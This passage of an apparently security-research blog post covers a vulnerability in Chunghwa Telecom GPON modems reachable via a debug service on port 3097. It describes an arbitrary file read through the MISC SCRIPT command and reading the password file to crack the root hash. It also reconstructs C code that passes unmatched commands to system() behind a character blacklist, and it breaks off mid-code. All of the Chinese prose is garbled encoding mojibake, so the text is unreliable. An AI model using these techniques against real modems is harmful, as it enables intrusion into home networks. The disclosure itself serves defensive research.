&lt;p&gt;Áõ∏ËºÉÊñº‰ª•ÂæÄÂ∞çÂÆ∂Áî®Êï∏ÊìöÊ©üÁöÑÊîªÊìäÔºåÈÄôÊ¨°ÁöÑÂΩ±ÈüøÊòØÊõ¥Âö¥ÈáçÁöÑ! ‰ª•ÂæÄÂ∞±ÁÆóÊºèÊ¥ûÂÜçÂö¥ÈáçÔºåÂè™Ë¶ÅÂÆ∂Áî®Êï∏ÊìöÊ©üÂ∞çÂ§ñ‰∏çÈñãÊîæ‰ªª‰ΩïÈÄ£Êé•Âü†ÔºåÊîªÊìäËÄÖ‰πüÁÑ°Ê≥ïÂà©Áî®Ôºå‰ΩÜÈÄôÊ¨°ÁöÑÊºèÊ¥ûÂåÖÂê´‰∏≠ËèØÈõª‰ø°ÁöÑÈÖçÁΩÆÂ§±Ë™§ÔºåÂ∞éËá¥‰Ω†ÂÆ∂ÁöÑÊï∏ÊìöÊ©üÂú®Á∂≤Ë∑Ø‰∏äË£∏Â•îÔºåÊîªÊìäËÄÖÂÉÖÂÉÖ &lt;strong&gt;„ÄåÂè™Ë¶ÅÁü•ÈÅì‰Ω†ÁöÑ IP ‰æøÂèØ‰∏çÈúÄ‰ªª‰ΩïÊ¢ù‰ª∂ÔºåÁõ¥Êé•ÈÄ≤ÂÖ•‰Ω†ÂÆ∂ÂÖßÁ∂≤„Äç&lt;/strong&gt;ÔºåËÄå‰∏îÔºåÁî±ÊñºÊ≤íÊúâÊï∏ÊìöÊ©üÁöÑÊéßÂà∂Ê¨äÔºåÊâÄ‰ª•ÈÄôÂÄãÊîªÊìä‰∏ÄËà¨Áî®Êà∂ÊòØÁÑ°Ê≥ïÈò≤Á¶¶Âèä‰øÆË£úÁöÑ!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéÂÖ®Á∂≤ IPv4 ÁöÑÊéÉÁûÑÔºåÂÖ®Âè∞ÁÅ£Á¥ÑÊúâ 25 Ëê¨Âè∞ÁöÑÊï∏ÊìöÊ©üÂ≠òÂú®Ê≠§ÂïèÈ°åÔºå&lt;strong&gt;„Äå‰ª£Ë°®Ëá≥Â∞ë 25 Ëê¨ÂÄãÂÆ∂Â∫≠ÂèóÂΩ±Èüø„Äç&lt;/strong&gt;Ôºå‰∏çÈÅéÈÄôÂÄãÁµêÊûúÂè™Âú® &lt;strong&gt;„ÄåÊéÉÊèèÁï∂‰∏ãÊúâÈÄ£‰∏äÁ∂≤Ë∑ØÁöÑÊï∏ÊìöÊ©üÊâçË¢´Á¥çÂÖ•Áµ±Ë®à„Äç&lt;/strong&gt;ÔºåÊâÄ‰ª•ÂØ¶ÈöõÂèóÂÆ≥Áî®Êà∂‰∏ÄÂÆöÂ§ßÊñºÈÄôÂÄãÊï∏Â≠ó!&lt;/p&gt;

&lt;p&gt;ËÄåÈÄèÈÅéÁ∂≤Ë∑ØÂú∞ÂùÄÁöÑÂèçÊü•ÔºåÊúâÈ´òÈÅî‰πùÊàêÁöÑÂèóÂÆ≥Áî®Êà∂ÊòØ‰∏≠ËèØÈõª‰ø°ÁöÑÂãïÊÖã IPÔºåËÄåÂâ©‰∏ãÁöÑ‰∏ÄÊàêÂâáÂåÖÂê´Âõ∫ÂÆöÂà∂ IP ÂèäÂÖ∂‰ªñÈõª‰ø°ÂÖ¨Âè∏ÔºåËá≥ÊñºÁÇ∫‰ΩïÊúÉÊúâÂÖ∂‰ªñÈõª‰ø°ÂÖ¨Âè∏Âë¢? ÊàëÂÄëÁöÑÁêÜËß£ÊòØ‰∏≠ËèØÈõª‰ø°‰ΩúÁÇ∫Âè∞ÁÅ£ÊúÄÂ§ßÈõª‰ø°ÂïÜÔºåÊâÄÊåÅÊúâÁöÑË≥áÊ∫ê‰ª•ÂèäÁ°¨È´îË®≠ÊñΩ‰πüÊòØÂÖ∂‰ªñÈõª‰ø°ÂïÜÈÅ†ÈÅ†‰∏çÂèäÁöÑÔºåÂõ†Ê≠§Âú®‰∏Ä‰∫õÊØîËºÉÂÅèÂÉªÁöÑÂú∞ÊÆµÂèØËÉΩÂÖ∂‰ªñÈõª‰ø°ÂïÜÂà∞‰ΩøÁî®ËÄÖÁöÑÊúÄÂæå‰∏ÄÂì©Ë∑Ø‰πüÈÇÑÊòØ‰∏≠ËèØÈõª‰ø°ÁöÑË®≠ÂÇô! Áî±ÊñºÊàëÂÄë‰∏çÊòØÂª†ÂïÜÔºåÁÑ°Ê≥ïÂæóÁü•ÂÆåÊï¥ÂèóÂΩ±ÈüøÁöÑÊï∏ÊìöÊ©üÂûãËôüÂàóË°®Ôºå‰ΩÜÁ≠ÜËÄÖ‰πüÊòØÂèóÂÆ≥ËÄÖ ‚ïÆ(‚ïØ_‚ï∞)‚ï≠ÔºåÊâÄ‰ª•ÂèØ‰ª•Á¢∫ÂÆöÊúÄÂ§ö‰∫∫‰ΩøÁî®ÁöÑ&lt;a href=&quot;https://broadband.hinet.net/rate.do&quot;&gt;‰∏≠ËèØÈõª‰ø°ÂÖâ‰∏ñ‰ª£ GPON Êï∏ÊìöÊ©ü&lt;/a&gt; ‰πüÂú®ÂèóÂΩ±ÈüøÁØÑÂúçÂÖß!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/1.png&quot; alt=&quot;&quot; /&gt;
(&lt;a href=&quot;https://www.hungry.tw/2014/12/MiWifi.html&quot;&gt;ÂúñÁâáÊì∑Ëá™Á∂≤Ë∑Ø&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÊåñÊéò&quot;&gt;ÊºèÊ¥ûÊåñÊéò&lt;/h2&gt;

&lt;p&gt;Âè™ÊòØ‰∏ÄÂÄãÈÖçÁΩÆÂ§±Ë™§‰∏¶‰∏çËÉΩË™™ÊòØ‰ªÄÈ∫ºÂ§ßÂïèÈ°åÔºåÊâÄ‰ª•Êé•‰∏ã‰æÜÊàëÂÄëÂ∏åÊúõËÉΩÂú®ÈÄôÂÄãÊúçÂãô‰∏äÊåñÊéòÂá∫Êõ¥Âö¥ÈáçÁöÑÊºèÊ¥û! ËªüÈ´îÊºèÊ¥ûÁöÑÊåñÊéòÔºåÊ†πÊìöÂéüÂßãÁ¢º„ÄÅÂü∑Ë°åÊ™î‰ª•Âèä API Êñá‰ª∂ÁöÑÊúâÁÑ°ÂèØ‰æùÂ∫èÂàÜÁÇ∫:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÈªëÁÆ±Ê∏¨Ë©¶&lt;/li&gt;
  &lt;li&gt;ÁÅ∞ÁÆ±Ê∏¨Ë©¶&lt;/li&gt;
  &lt;li&gt;ÁôΩÁÆ±Ê∏¨Ë©¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âú®‰ªÄÈ∫ºÈÉΩÊ≤íÊúâÁöÑÁöÑÁãÄÊ≥Å‰∏ãÔºåÂè™ËÉΩ‰æùÈù†Á∂ìÈ©ó‰ª•ÂèäÂ∞çÁ≥ªÁµ±ÁöÑ‰∫ÜËß£ÂéªÁåúÊ∏¨ÊØèÂÄãÊåá‰ª§ËÉåÂæåÁöÑÂØ¶‰Ωú„ÄÅ‰∏¶ÊâæÂá∫ÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÈªëÁÆ±Ê∏¨Ë©¶&quot;&gt;ÈªëÁÆ±Ê∏¨Ë©¶&lt;/h3&gt;

&lt;p&gt;3097 ÈÄ£Êé•Âü†Êèê‰æõ‰∫ÜË®±Â§öË∑üÈõª‰ø°Á∂≤Ë∑ØÁõ∏ÈóúÁöÑÊåá‰ª§ÔºåÊé®Ê∏¨ÊòØ‰∏≠ËèØÈõª‰ø°Áµ¶Â∑•Á®ãÂ∏´ÈÅ†Á´ØÂ∞çÊï∏ÊìöÊ©üÈÄ≤Ë°åÂêÑÁ®ÆÁ∂≤Ë∑ØË®≠ÂÆöÁöÑÈô§ÈåØ‰ªãÈù¢!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÔºåÂèØ‰ª•ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; Êåá‰ª§ÂàóÂá∫ÊâÄÊúâÂäüËÉΩÔºåÂÖ∂‰∏≠ÊàëÂÄëÁôºÁèæ‰∫Ü‰∏ÄÂÄãÊåá‰ª§Âè´ÂÅö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC&lt;/code&gt; ÔºåÁúãÂêçÂ≠óÊÑüË¶∫Â∞±ÊòØÊää‰∏ÄÂ†Ü‰∏çÁü•ÈÅìÊÄéÈ∫ºÂàÜÈ°ûÁöÑÊåá‰ª§Ê≠∏È°ûÂú®ÈÄôÔºåËÄåÂÖ∂‰∏≠‰∏ÄÂÄãÂè´ÂÅö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCRIPT&lt;/code&gt; Âê∏Âºï‰∫ÜÊàëÂÄë! ÂÆÉÁöÑÂèÉÊï∏ÁÇ∫‰∏ÄÂÄãÊ™îÊ°àÂêçÁ®±ÔºåÂü∑Ë°åÂæåÂÉèÊòØÊúÉÊääÊ™îÊ°àÁï∂Êàê Shell Script ‰æÜÂü∑Ë°åÔºå‰ΩÜÂú®ÁÑ°Ê≥ïÂú®ÈÅ†Á´ØÊ©üÂô®Áïô‰∏ã‰∏ÄÂÄãÂèØÊéßÊ™îÊ°àÁöÑÂâçÊèê‰∏ãÔºå‰πüÁÑ°Ê≥ïÈÄèÈÅéÈÄôÂÄãÊåá‰ª§ÂèñÂæó‰ªªÊÑè‰ª£Á¢ºÂü∑Ë°å„ÄÇ ‰∏çÈÅéÊúâË∂£ÁöÑÊòØÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MISC SCRIPT&lt;/code&gt; ÈÄôÂÄãÊåá‰ª§ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; Áµ¶È°ØÁ§∫Âá∫‰æÜÔºåÂõ†Ê≠§ÂèØ‰ª•ÈÄèÈÅéÈÄôÂÄãÁâπÊÄßÂéªÂÆåÊàê‰ªªÊÑèÊ™îÊ°àËÆÄÂèñ!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂæûÈªëÁÆ±ÈÄ≤ÂåñÊàêÁÅ∞ÁÆ±&quot;&gt;ÂæûÈªëÁÆ±ÈÄ≤ÂåñÊàêÁÅ∞ÁÆ±&lt;/h3&gt;

&lt;p&gt;Âú®ÊºèÊ¥ûÁöÑÂà©Áî®‰∏äÔºåÁÑ°Ë´ñÊòØË®òÊÜ∂È´îÁöÑÂà©Áî®„ÄÅÊàñÊòØÁ∂≤Ë∑ØÁöÑÊª≤ÈÄèÔºå‰∏çÂ§ñ‰πéÈÉΩÂúçÁπûËëóÂ∞çÁõÆÊ®ôÁöÑËÆÄ(Read)„ÄÅ ÂØ´(Write) ‰ª•Âèä‰ª£Á¢ºÂü∑Ë°å(eXecute) ‰∏âÂÄãÊ¨äÈôêÁöÑÂèñÂæóÔºåÁèæÂú®ÊàëÂÄëÂèñÂæó‰∫ÜÁ¨¨‰∏ÄÂÄãËÆÄÁöÑÊ¨äÈôêÔºåÊé•‰∏ã‰æÜÂë¢?&lt;/p&gt;

&lt;p&gt;Èô§ÈåØ‰ªãÈù¢Ë≤å‰ººË∑ëÂú®È´òÊ¨äÈôê‰ΩøÁî®ËÄÖ‰∏ãÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÈÄèÈÅéËÆÄÂèñÁ≥ªÁµ±ÂØÜÁ¢ºÊ™îÂæóÂà∞Á≥ªÁµ±‰ΩøÁî®ËÄÖÁÆ°ÁêÜÁôªÂÖ•ÁöÑÂØÜÁ¢ºÈõúÊπä!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄèÈÅéÂ∞ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; ‰ΩøÁî®ËÄÖÂØÜÁ¢ºÈõúÊπäÁöÑÁ†¥Ëß£ÔºåÊàëÂÄëÊàêÂäüÁöÑÁôªÂÖ•Êï∏ÊìöÊ©ü SSH Â∞á„ÄåÈªëÁÆ±„ÄçËΩâÂåñÊàê„ÄåÁÅ∞ÁÆ±„Äç! ÈõñÁÑ∂ÁèæÂú®ÂèØ‰ª•ÊàêÂäüÊéßÂà∂Ëá™Â∑±ÁöÑÊï∏ÊìöÊ©üÔºå‰ΩÜ‰∏ÄËà¨ÂÆ∂Áî®Êï∏ÊìöÊ©üÂ∞çÂ§ñÊòØ‰∏çÊúÉÈñãÊîæ SSH ÊúçÂãôÁöÑÔºåÁÇ∫‰∫ÜÈÅîÂà∞ÂèØ‰ª•„ÄåÈÅ†Á´Ø„ÄçÊéßÂà∂Âà•‰∫∫ÁöÑÊï∏ÊìöÊ©üÔºåÊàëÂÄëÈÇÑÊòØÂæóÊÉ≥Ëæ¶Ê≥ïÂæû 3097 ÈÄôÂÄãÊúçÂãôÊãøÂà∞‰ª£Á¢ºÁöÑÂü∑Ë°åÊ¨äÈôê„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Êï¥ÂÄã‰∏≠ËèØÈõª‰ø°ÁöÑÊï∏ÊìöÊ©üÊòØ‰∏ÄÂÄãË∑ëÂú® MIPS ËôïÁêÜÂô®Êû∂Êßã‰∏äÁöÑÂµåÂÖ•Âºè Linux Á≥ªÁµ±ÔºåËÄå 3097 ÊúçÂãôÂâáÊòØÁî±‰∏ÄÂÄãÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/omcimain&lt;/code&gt; ÁöÑ‰∫åÈÄ≤‰ΩçÊ™îÊ°à‰æÜËôïÁêÜÔºåÊï¥ÂÄãÊ™îÊ°àÂ§ßÂ∞èÊúâÂ∞áËøë 5MBÔºåÂ∞çÈÄÜÂêëÂ∑•Á®ã‰æÜË™™‰∏¶‰∏çÊòØ‰∏ÄÂÄãÂ∞èÊï∏ÁõÆÔºå‰ΩÜËàáÈªëÁÆ±Ê∏¨Ë©¶Áõ∏ËºÉ‰πã‰∏ãÔºåËá≥Â∞ëÊúâ‰∫ÜÊù±Ë•øÂèØ‰ª•ÂàÜÊûê‰∫ÜÁúüÊ£í!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uname -a
Linux I-040GW.cht.com.tw 2.6.30.9-5VT #1 PREEMPT Wed Jul 31 15:40:34 CST 2019
[luna SDK V1.8.0] rlx GNU/Linux

$ netstat -anp | grep 3097
tcp        0      0 127.0.0.1:3097          0.0.0.0:*               LISTEN

$ ls -lh /usr/bin/omcimain
-rwxr-xr-x    1 root   root        4.6M Aug  1 13:40 /usr/bin/omcimain

$ file /usr/bin/omcimain
ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÂæûÁÅ∞ÁÆ±ÈÄ≤ÂåñÊàêÁôΩÁÆ±&quot;&gt;ÂæûÁÅ∞ÁÆ±ÈÄ≤ÂåñÊàêÁôΩÁÆ±&lt;/h3&gt;

&lt;p&gt;ÁèæÂú®ÔºåÊàëÂÄëÂèØ‰ª•ÈÄèÈÅéÈÄÜÂêëÂ∑•Á®ã‰∫ÜËß£ÊØèÂÄãÊåá‰ª§ËÉåÂæåÁöÑÂéüÁêÜÂèäÂØ¶‰Ωú‰∫Ü! ‰∏çÈÅéÈ¶ñÂÖàÔºåÈÄÜÂêëÂ∑•Á®ãÊòØ‰∏ÄÂÄãÁóõËã¶‰∏îÁÖ©ÊÇ∂ÁöÑÁ∂ìÈÅéÔºå‰∏ÄÂÄãÂ∞èÂ∞èÁöÑÁ®ãÂºèÂèØËÉΩÂ∞±ÂåÖÂê´ÂπæËê¨„ÄÅÁîöËá≥ÂçÅÂπæËê¨Ë°åÁöÑÁµÑÂêàË™ûË®Ä‰ª£Á¢ºÔºåÂõ†Ê≠§ÈÄôÊôÇÊåñÊ¥ûÁöÑÁ≠ñÁï•Â∞±ËÆäÂæóÂæàÈáçË¶Å! ÂæûÂäüËÉΩÈù¢‰æÜÁúãÔºåÊÑüË¶∫ÊúÉÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•Áõ∏ÈóúÁöÑÊºèÊ¥ûÔºåÂõ†Ê≠§ÂÖà‰ª•ÂäüËÉΩÂØ¶‰ΩúÁÇ∫Âá∫ÁôºÈªûÈñãÂßãÊåñÊéò!&lt;/p&gt;

&lt;p&gt;Êï¥ÂÄã 3097 ÊúçÂãôÁöÑËôïÁêÜÊ†∏ÂøÉÂÖ∂ÂØ¶Â∞±ÊòØ‰∏ÄÂÄãÂ§öÂ±§ÁöÑ IF-ELSE ÈÅ∏È†ÖÔºåÊØè‰∏ÄÂÄãÂ∞èÊ°ÜÊ°ÜÂ∞çÊáâÁöÑ‰∏ÄÂÄãÂäüËÉΩÁöÑÂØ¶‰ΩúÔºå‰æãÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cli_config_cmdline&lt;/code&gt; Â∞±ÊòØÂ∞çÊáâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONFIG&lt;/code&gt; ÈÄôÊ¢ùÊåá‰ª§ÔºåÂõ†Ê≠§ÊàëÂÄëÊê≠ÈÖçËëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HELP&lt;/code&gt; Êåá‰ª§ÁöÑÊèêÁ§∫‰∏Ä‰∏ÄÂæÄÊØèÂÄãÂäüËÉΩÂØ¶‰ΩúÊåñÊéò!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Á†îÁ©∂‰∫Ü‰∏ÄÊÆµÊôÇÈñìÔºå‰∏¶Ê≤íÊúâÁôºÁèæÂà∞‰ªÄÈ∫ºÂö¥ÈáçÊºèÊ¥û :( ‰∏çÈÅéÊàëÂÄëÊ≥®ÊÑèÂà∞ÔºåÁï∂ÊâÄÊúâÊåáÂëΩÈÉΩÂåπÈÖçÂ§±ÊïóÊôÇÔºåÊúÉÈÄ≤ÂÖ•Âà∞‰∫Ü‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; ÁöÑÂáΩÊï∏ÔºåÈÄôÂÄãÂáΩÊï∏ÁöÑ‰∏ªË¶ÅÁõÆÁöÑÊòØÊääÂåπÈÖçÂ§±ÊïóÁöÑÊåá‰ª§Êé•Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; ÂæåÁπºÁ∫åÂü∑Ë°å!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;with_fallback&lt;/code&gt; Â§ßËá¥ÈÇèËºØÂ¶Ç‰∏ãÔºåÁî±ÊñºÁï∂ÊôÇ Ghidra Â∞öÊú™Âá∫ÁèæÔºåÊâÄ‰ª•ÈÄô‰ªΩÂéüÂßãÁ¢ºÊòØÂæûÈñ±ËÆÄ MIPS ÁµÑÂêàË™ûË®ÄÊÖ¢ÊÖ¢ÈÇÑÂéüÂõû‰æÜÁöÑ! ÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s1&lt;/code&gt; ÁÇ∫Ëº∏ÂÖ•ÁöÑÊåá‰ª§ÔºåÂ¶ÇÊûúÊåá‰ª§‰∏çÂú®ÂÆöÁæ©Â•ΩÁöÑÂàóË°®ÂÖß‰ª•ÂèäÊåá‰ª§‰∏≠Âá∫ÁèæÂïèËôüÁöÑË©±ÔºåÂ∞±Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/diag&lt;/code&gt; ÊãºÊπäËµ∑‰æÜ‰∏üÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; Âü∑Ë°å! ÁêÜÊâÄÁï∂ÁÑ∂ÔºåÁÇ∫‰∫ÜÈò≤Ê≠¢ÂëΩ‰ª§Ê≥®ÂÖ•Á≠âÁõ∏ÈóúÂº±ÈªûÔºåÂú®‰∏üÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; ÂâçÊúÉÂÖàÊ†πÊìö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; ÁöÑÂàóË°®Ê™¢Êü•ÊòØÂê¶Â≠òÂú®ÊúâÂÆ≥Â≠óÂÖÉ„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;util_trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;#&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUB_COMMAND_LIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;util_fdprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid char &apos;%c&apos; in command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 